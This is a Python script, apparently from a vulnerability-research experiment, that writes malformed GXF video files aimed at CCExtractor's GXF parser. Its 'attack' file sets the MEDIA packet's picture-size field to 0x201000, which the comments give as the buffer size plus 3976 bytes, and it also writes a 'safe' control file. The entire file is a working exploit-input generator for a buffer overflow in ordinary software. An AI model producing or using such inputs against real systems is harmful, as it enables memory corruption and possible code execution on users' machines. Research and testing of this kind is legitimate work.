#!/usr/bin/env python3
"""Local-only GXF generator for the ccextractor2shell pinned-tree experiment.

Packet layout follows the pinned src/lib_ccx/ccx_gxf.c (commit
2c1c1c6f0602563d2064f2b0c36f13b3c7a09489): 16-byte packet header
00 00 00 01 <type> <be32 total length> <4 reserved> E1 E2, then body.
The MAP packet establishes an MPEG2 525 track (type 0x8B, id 0xC0,
zero-length track descriptor); the MEDIA packet carries the 4-byte
big-endian mpeg_pic_size field and its payload.
"""
import struct
import sys
from pathlib import Path


def packet(kind: int, body: bytes) -> bytes:
    total = 16 + len(body)
    header = b"\x00\x00\x00\x00\x01" + bytes([kind]) + struct.pack(">I", total)
    header += b"\x00\x00\x00\x00" + b"\xe1\xe2"
    assert len(header) == 16
    return header + body


def map_packet() -> bytes:
    # parse_map(): e0ff marker, empty material section, one MPEG2-525
    # track descriptor (type 0x80|11, id 0xC0) with a 25 fps TRACK_FPS tag.
    track = bytes([0x80 | 11, 0xC0]) + struct.pack(">H", 6)
    track += bytes([0x50, 4]) + struct.pack(">I", 6)
    body = b"\xe0\xff" + struct.pack(">H", 0) + struct.pack(">H", len(track))
    return packet(0xBC, body + track)

def media_packet(pic_size: int, payload_len: int, seed: bytes) -> bytes:
    assert pic_size <= payload_len
    body = bytes([11, 0]) + struct.pack(">I", 0)  # media type, track, field
    body += struct.pack(">I", pic_size)            # 00 20 10 00 for the attack
    body += struct.pack(">I", 0) + b"\x00\x00"    # time field, valid flag, reserved
    assert len(body) == 16
    payload = (seed * ((payload_len // len(seed)) + 1))[:payload_len]
    return packet(0xBF, body + payload)


def main() -> None:
    out = Path(sys.argv[1])
    out.mkdir(parents=True, exist_ok=True)
    seed = b"MISHE-CCEX"
    # Attack: 0x201000 = BUFSIZE + 3976; safe: 4096.
    for name, size, payload_len in (("attack", 0x201000, 0x201000),
                                    ("safe", 0x1000, 0x1000)):
        data = map_packet() + media_packet(size, payload_len, seed)
        path = out / f"{name}.gxf"
        path.write_bytes(data)
        print(f"{path} size={len(data)} media_size_field={size:#x}")


if __name__ == "__main__":
    main()
